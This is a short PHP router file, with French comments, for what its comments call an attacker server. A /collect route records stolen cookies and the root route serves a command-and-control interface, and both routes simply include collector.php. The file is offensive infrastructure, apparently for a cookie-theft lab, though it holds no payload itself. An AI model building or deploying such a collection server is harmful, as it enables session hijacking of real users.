<?php
// index.php — Routeur du serveur attaquant
// Route /collect → enregistrement du cookie
// Route /         → interface C2

$uri = $_SERVER['REQUEST_URI'];

if (strpos($uri, '/collect') === 0) {
    // Rediriger vers collector.php avec les paramètres GET
    require_once 'collector.php';
} else {
    require_once 'collector.php';
}
